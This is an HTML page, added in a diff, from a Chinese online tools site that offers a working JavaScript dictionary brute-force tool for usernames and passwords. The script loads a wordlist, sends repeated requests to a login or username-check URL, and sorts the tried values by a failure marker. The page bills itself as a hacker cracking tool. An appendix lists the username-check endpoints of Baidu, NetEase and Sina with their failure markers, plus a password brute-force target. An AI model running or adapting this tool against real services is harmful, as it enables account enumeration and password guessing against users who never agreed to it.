@@ -1,0 +1,482 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=gb2312">
+<title>字典探测用户名或密码工具-客齐齐实用查询工具</title>
+<meta name="keywords" content="字典探测用户名或密码工具">
+<meta content="字典探测用户名或密码工具,密码探测,用户名探测,黑客工具,暴力破解,破解!" name="description" />
+<link href="../images/style.css" rel="stylesheet" type="text/css" />
+<style type="text/css">
+<!--
+body {margin:0; padding:0;background: #FFF url('../images/top3.gif') repeat-x top; font-size:12px;color:#666}
+.style1 {font-size: 14px}
+-->
+</style>
+ <script language="javascript">
+
+/*
+程序标题：javascript字典探测用户名工具
+发布时间：2006年8月
+文章作者：翟振凯 (小琦)
+作者网站：http://www.xiaoqi.net    
+作者论坛：http://www.tdqy.com
+演示地址：http://www.xiaoqi.net/zuopin/js_user_swf.htm
+QQ：22336848 53353866
+关于本文：
+	授人予鱼，不如授人予渔。本程序的核心代码处，都有详细的注解，
+	目地是让大家了解一个程序的开发过程和这个程序功能的实现原理，
+	而不仅仅是给大家提供一个这样的工具。希望看过本文后的朋友会有
+	所收获，能和我共同分享用javascript编写程序的乐趣。
+*/
+
+//尝试用IE浏览器的方式创建XMLHttpRequest对象
+var xmlhttp = null; 
+try 
+{ 
+    xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");  
+} 
+catch(e) 
+{ 
+    try 
+    { 
+        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+    } 
+    catch(e){
+        alert("您的浏览器不能创建XMLHttpRequest对象，无法使用此程序!");
+    } 
+} 
+//尝试用IE浏览器的方式创建XMLHttpRequest对象结束
+
+/*
+翟振凯注：MSXML2.XMLHTTP 和 Microsoft.XMLHTTP 都是微软的XMLHTTP控件，只是版本不同。
+		  IE的安全级别如果不是太高，微软的XMLHTTP控件是可以跨域获取数据的。
+		  因为 Mozilla Firefox 浏览器的 XMLHttpRequest() 不能跨域获取数据，我们就不用 XMLHttpRequest() 方法创建XMLHTTP对象了。
+*/
+
+
+//对返回的中文编码处理 作者：翟振凯
+function Rec_Html(Html)
+{
+	var Rec=new ActiveXObject("ADODB.RecordSet");	
+	Rec.Fields.Append("xiaoqi",201,1);	
+	Rec.Open();	
+	Rec.AddNew();	
+	Rec(0).AppendChunk(Html);	
+	Rec.Update();	
+	return Rec(0).Value;
+	Rec.Close();
+}
+//对返回的中文编码处理结束
+
+
+//开始探测 参数为要探测的当前值 
+function geturl(id)
+{
+try{
+           xmlhttp.open("GET",url.value+id,false);//定义数据传送方式，服务网页的URL(探测地址+探测值)，是否同步执行
+           xmlhttp.onreadystatechange = function() {//xmlhttp 触发事件
+
+          if(xmlhttp.readyState==4)//xmlhttp对象状态如果为完成
+          {    
+          if(xmlhttp.status==200)    //如果服务器返回的状态码为200(成功)
+          {  
+  
+                 //对结果的中文编码转换判断
+                 if(err.value.replace(/[^\W]/g,'').length=0)
+                 /*关于转换判断的注：
+                   例如:"翟振凯".replace(/[^\W]/g,'').length          返回结果 3 
+                        "翟振凯22336848".replace(/[^\W]/g,'').length  返回结果 3
+                        "xiaoqi22336848".replace(/[^\W]/g,'').length  返回结果 0
+                        "小琦22336848".replace(/[^\W]/g,'').length    返回结果 2
+                   replace(/[^\W]/g,'')的功能是把字符串里的英文和数字都清除掉。
+                  */
+                    {
+                            Html=xmlhttp.responseText;//不转换
+                    }
+                 else 
+                     {
+                             Html=Rec_Html(xmlhttp.responseBody);//转换
+                    }
+                 //对结果的中文编码转换判断结束
+
+                                        
+                 // 根据判断依据区分可用或不可用的值!
+                 if(Html.indexOf(err.value,0)<0)
+                     {
+                            x_1.innerHTML=x_1.innerHTML+"<nobr>　"+id;//输出可用值
+                     }
+                 else 
+                     {
+                            x_2.innerHTML=x_2.innerHTML+"<nobr>　"+id;//输出不可用值
+                     }
+                 // 根据判断依据区分可用或不可用的值!
+          }    
+          }    
+          }    
+           xmlhttp.send();
+          }    
+catch(e)    
+{ 
+x_2.innerHTML=x_2.innerHTML+"<nobr>　"+id+"超时!";//输出异常或超时的值。
+}           
+}
+//开始探测结束
+
+
+//载入本地字典文件，并把内容定义为数组
+function kaishi(){ 
+        fileFullPath=dic_url.value;
+        xmlhttp.open("GET",fileFullPath,false);//载入字典文件方法
+        xmlhttp.send();
+
+        Html=Rec_Html(xmlhttp.responseBody);//中文编码转换        
+        dic=Html.split('\r\n');//以换行符将载入的字典内容转换为数组    
+        sl.value=dic.length;//告诉用户要探测的次数(数组大小)
+
+xunhuan()//成功载入后开始循环探测。
+}
+//载入本地字典文件，并把内容定义为数组结束
+
+
+//循环探测
+function xunhuan()
+{
+        bar=parseInt(jd.value);//将进度值转换为整数
+        if(bar<sl.value)//判断是否探测完
+        {
+                for(i=0;i<parseInt(jc.value);i++){//设定探测线程
+                        geturl(dic[bar+i]);//从数组内取值进行探测               
+                }
+           
+                jd.value=bar+parseInt(jc.value);//累加探测进度，并向用户呈现当前进度
+                setTimeout("xunhuan()",parseInt(hc.value*1000));//根据缓冲时间来进行重复循环探测        
+        }
+        else//如果进度不小于要探测的次数，就向用户返回探测完成的结果。
+        {
+                alert("探测完成!");
+        }
+}
+//循环探测结束
+
+
+//暂停探测函数
+function pause(obj)
+{
+	if(obj.value=='暂停')
+		{
+		obj.temp=hc.value;//记忆原来的缓冲时间。
+		hc.value=5000;//将缓冲时间设置为5000秒，这个值自己可以修改。
+		obj.value='继续';//改变按钮显示状态
+		} 
+	else 
+		{
+		hc.value=obj.temp;//提取原来的缓冲时间。
+		obj.value='暂停';//改变按钮显示状态
+		kaishi()//继续探测
+		}
+}
+//暂停探测函数结束
+
+
+function ck()//单个值探测验证检查
+{
+	if (url.value.length<5){alert('请输入要探测地址!');return};
+	if (id_one.value.length<1){alert('请输入要探测的值!');return};
+	geturl(id_one.value)
+}
+
+function ck1()//批量值探测验证检查
+{
+    if (url.value.length<5){alert("请输入要探测地址!");return}
+    if (err.value.length<1){alert("请输入不可用标记!");return}
+    if (dic_url.value.length<5){alert("请先选择字典文件!");return}
+    jd.value=0;
+    kaishi()
+}
+</script>
+</HEAD>
+<BODY>
+<table width="960" height="75" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td width="264" rowspan="2" align="center"><a href="../index.html">
+	<img src="../images/logo.gif" width="224" height="38" border="0" /></a></td>
+    <td height="24" valign="top">
+	<table width="321" height="24" border="0" align="right" cellpadding="0" cellspacing="0" background="../images/top2.gif">
+       <tr>
+          <td align="center" class="cwhite12"><a href="#" class="cwhite12">tools.kqiqi.com</a>　<a href="#" OnClick='this.style.behavior="url(#default#homepage)";this.setHomePage("http://tools.kqiqi.com");' class="cwhite12">设为首页</a> | <a href="#" onClick="window.external.AddFavorite('http://tools.kqiqi.com','客齐齐实用查询工具');" class="cwhite12">收藏本站</a></td>
+        </tr>
+    </table></td>
+  </tr>
+</table>
+<table width="960" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td><table height="38" border="0" cellpadding="0" cellspacing="0" style="margin-left:5px">
+      <tr align="center">
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../index.html" class="navfh2">首　页</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../admin/index.html" class="navfh2">站长工具</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../query/index.html" class="navfh2">查询工具</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../calculation/index.html" class="navfh2">计算工具</a></td>
+          <td width="88" background="../images/nav2.gif" style="padding-top:5px"><a href="index.html" class="navfh1">加密解密</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../conversion/index.html" class="navfh2">转换工具</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../color/index.html" class="navfh2">颜色工具</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../web/index.html" class="navfh2">网络辅助</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../picture/index.html" class="navfh2">图片工具</a></td>
+          <td width="88" background="../images/nav1.gif" style="padding-top:5px"><a href="../others/index.html" class="navfh2">其它工具</a></td>
+        </tr>
+    </table></td>
+  </tr>
+</table>
+<script language="javascript" src="../js/others_top.js"></script>
+<table width="960" border="0" align="center" cellpadding="0" cellspacing="0" class="mainbg1">
+  <tr valign="top">
+    <td width="20">　</td>
+    <td width="190">
+<table width="100%"  border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td colspan="2" height="10">
+
+</td>
+</tr>
+      <tr>
+        <td width="75%">
+		<img src="../images/t9.gif" width="32" height="32" align="absmiddle" />　<span class="navfh1">工具列表</span></td>
+        <td width="25%">　</td>
+      </tr>
+    </table>
+     <table width="100%"  border="0" cellpadding="0" cellspacing="0" background="../images/t12.gif" class="mar5">
+        <tr>
+          <td height="10"> </td>
+        </tr>
+      </table>
+<table width="100%"  border="0" cellpadding="0" cellspacing="0" class="mar5">
+      <tr>
+        <td>　
+ <div id="menu">
+  <div class="box">
+    <a href="Escape.html">Escape加密解密
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+  <div class="box">
+    <a href="JS-VB.html">JS-VB方式加密解密
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+  <div class="box">
+    <a href="AllEncrypt.html">全能在线脚本加密器
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+  <div class="box">
+    <a href="MD5Encrypt.html">字符串MD5加密
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+  <div class="box">
+    <a href="WebEncrypt.html">网页在线加密解密
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+  <div class="box">
+    <a href="TextEncrypt.html">文字在线加密解密
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+<div class="box">
+    <a href="MakePassWord.html">随机密码生成程序
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+<div class="box">
+    <a href="JS-User.html">探测用户名或密码
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+<div class="box">
+    <a href="WebMD5.html">在线MD5解密/破解工具
+      <span class="left"></span>
+      <span class="right"></span>
+    </a>
+  </div>
+
+</div>
+ </td>
+      </tr>
+    </table>
+
+      <table width="100%" height="17"  border="0" cellpadding="0" cellspacing="0" background="t2.gif" class="mar5">
+        <tr>
+          <td> </td>
+        </tr>
+      </table>    </td>
+    <td width="27">　</td>
+    <td width="700">
+       <table width="100%"  border="0" cellspacing="0" cellpadding="0">
+          <tr>
+      <td height="10" colspan="2">
+      </td>
+      </tr>
+        <tr valign="top">
+         <td width="40"><img src="../images/bang.gif" width="32" height="32"> </td>
+          <td><span class="navfh1">字典探测用户名或密码工具</span></td>
+          <td align="right">            </td>
+        </tr>
+      </table>
+      <hr size="1" style="color:#E3E8E9" />
+      <table width="100%"  border="0" cellpadding="3" cellspacing="1">
+              <tr>
+          <td>
+       <table width="690" align="center" cellpadding="5" cellspacing="1" bgcolor="#d9d9d9">
+<tbody>
+<tr>
+<td bgcolor="#FFFFFF">
+注：如果无法使用，或结果显示超时，请将本页下载到本地计算机上使用。
+<fieldset >
+<legend>探测设置</legend>
+<table width="100%" border="0" cellpadding="2" cellspacing="1" bordercolorlight="#E6E6E6" bordercolordark="#D4D0C8">
+	<tr>
+		<td>探测地址</td>
+		<td>
+		<input type="text" id="url" size="63" value="http://www.xiaoqi.net/zuopin/login.asp?username=翟振凯&password="></td>
+	</tr>
+	<tr>
+		<td>失败包涵标记 </td>
+		<td><input type="text" id="err" size="63" value="不正确"></td>
+	</tr>
+	<tr>
+		<td>测试单个值</td>
+		<td><input type="text" id="id_one" size="20">
+		<input type="button" value="探测" onClick="ck();" class="button1"> </td>
+	</tr>
+	<tr>
+		<td>选择字典文件</td>
+		<td><input type="file" name="dic_url" size="20" value="">
+		<input type="button" value="开始" onClick="ck1();" class="button1">
+		<input type="button" value="暂停" temp="" onClick="pause(this)" class="button1">
+		<input type="button" value="清除可用结果" onClick="x_1.innerHTML=''" class="button2">
+		<input type="button" value="清除不可用结果" onClick="x_2.innerHTML=''" class="button2">
+		</td>
+	</tr>
+	<tr>
+		<td>高级参数</td>
+		<td>
+		每次探测：<input type="text" id="jc" value="1" size="3"> 个&nbsp; 
+		缓冲时间：<input type="text" id="hc" value="0.1" size="3"> 秒&nbsp; 
+		进度：<input type="text" id="jd" value="0" size="12">&nbsp; 
+		探测数量：<input type="text" id="sl" size="13">
+		</td>
+	</tr>
+</table>
+</fieldset> 
+
+<fieldset>
+<legend>可用值：</legend>
+<div style="height:100px;width:100%;overflow:auto;"><span id="x_1"></span></div></fieldset>
+
+<fieldset>
+<legend>不可用值：</legend>
+<div style="height:100px;width:100%;overflow:auto;"><span id="x_2"></span></div>
+</fieldset>
+
+　<p>附录：</p>
+<table border="0" width="100%" id="table1" cellspacing="0" cellpadding="3" class="td">
+	<tr style="font-weight: bold;">
+		<td width="111" class="td">测试字典文件地址</td>
+		<td width="633" colspan="3" class="td"> 
+		http://www.tool.la/JS-User/dic.txt</td>
+	</tr>
+	<tr style="font-weight: bold;" class="td">
+		<td width="111" class="td">网站名</td>
+		<td width="435" class="td">入口</td>
+		<td width="83" class="td">不可用标记</td>
+		<td width="105" class="td">备注</td>
+	</tr>
+	<tr>
+		<td width="111" class="td">百度用户注册</td>
+		<td width="435" class="td">http://passport.baidu.com/?check_username&amp;un=</td>
+		<td width="83" class="td">false</td>
+		<td width="105" class="td">　</td>
+	</tr>
+	<tr>
+		<td width="111" class="td">百度空间注册</td>
+		<td width="435" class="td">http://hi.baidu.com/sys/checkurl/item/</td>
+		<td width="83" class="td">false</td>
+		<td width="105" class="td">要先用百度用户登陆</td>
+	</tr>
+	<tr>
+		<td width="111" class="td">网易通行证注册</td>
+		<td width="435" class="td">http://reg.163.com/register/checkssn.jsp?username=</td>
+		<td width="83" class="td">对不起</td>
+		<td width="105" class="td">　</td>
+	</tr>
+	<tr>
+		<td width="111" class="td">新浪通行证</td>
+		<td width="435" class="td">
+		<input type="text" size="57" value="http://unipro.sina.com.cn/cgi-bin/t5checkuser0.cgi?encpm=96ad1b22f3b6f5d641980dd7515d40b0779972460aea0f857bfd45c63380c909382087da578a10a278fa840c6cec9cb2c933eace6ef114ae61938a14a2f9fa569f33421b346faae845af2b99a203408ef831de7de17ae6726224b2f89f65efeb089ed08084afb13b8b9232bd10a7ede7fd2a6b3d2181558bef80c3a45976850d&amp;email=&amp;password=&amp;password2=&amp;pwdQ=&amp;pwdA=&amp;sex=&amp;byear=1986&amp;bmonth=01&amp;bday=01&amp;options=&amp;outinstr=&amp;safe_num=&amp;safe_num2=&amp;identityinfo=&amp;identityNum=&amp;checkidentityNum=&amp;ismail=&amp;userid="></td>
+		<td width="83" class="td">登录名被占用</td>
+		<td width="105" class="td">　</td>
+	</tr>
+	<tr>
+		<td width="111" class="td">测试网站用户密码暴力破解</td>
+		<td width="435" class="td">
+		http://www.xiaoqi.net/zuopin/login.asp?username=翟振凯&amp;password=</td>
+		<td width="83" class="td">不正确</td>
+		<td width="105" class="td">　</td>
+	</tr>
+	<tr>
+		<td width="111" class="td">测试网站用户密码暴力破解</td>
+		<td width="435" class="td">
+		http://www.xiaoqi.net/zuopin/login.asp?username=小琦&amp;password=</td>
+		<td width="83" class="td">不正确</td>
+		<td width="105" class="td">　</td>
+	</tr>
+</table>
+　<input type="hidden" id="dic1" value="ff"><input type="hidden" id="jc_id" value><p>
+程序作者：翟振凯 开发日期：2006年8月<br>
+作者网站：<a href="http://www.xiaoqi.net" target="_blank">http://www.xiaoqi.net</a><br>
+演示地址：<a href="http://www.xiaoqi.net/zuopin/js_user_swf.htm" target="_blank">http://www.xiaoqi.net/zuopin/js_user_swf.htm</a><br>
+程序打包下载地址：<a href="http://www.xiaoqi.net/zuopin/js_user.rar" target="_blank">http://www.xiaoqi.net/zuopin/js_user.rar</a></p>
+</p>
+</td>
+</tr>
+</tbody>
+</table>
+          
+          </td>
+        </tr>
+        </table>
+              <br />
+               <script type="text/javascript" src="../js/wz.js"></script>
+         <script type="text/javascript" src="../js/Copy.js"></script>
+         <br />
+      </td>
+    <td width="20">　</td>
+  </tr>
+</table>
+<table width="960" border="0" align="center" cellpadding="0" cellspacing="0" class="mainbg2">
+  <tr>
+    <td height="25"></td>
+  </tr>
+</table>
+
+<table width="960" border="0" align="center" cellpadding="0" cellspacing="0" class="mainbg2">
+  <tr>
+    <td><table width="920"  border="0" align="center" cellpadding="0" cellspacing="20" class="bottombg">
+      <tr>
+        <td align="center">
+        Copyright &copy; <a href="http://tools.kqiqi.com/">客齐齐实用查询工具</a> All rights reserved - <a href="../map.html">网站地图</a> - <a href="../contact.html">联系我们</a> - <script language="javascript" src="../js/bottom.js"></script>
+        </td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+</body>
+</html>
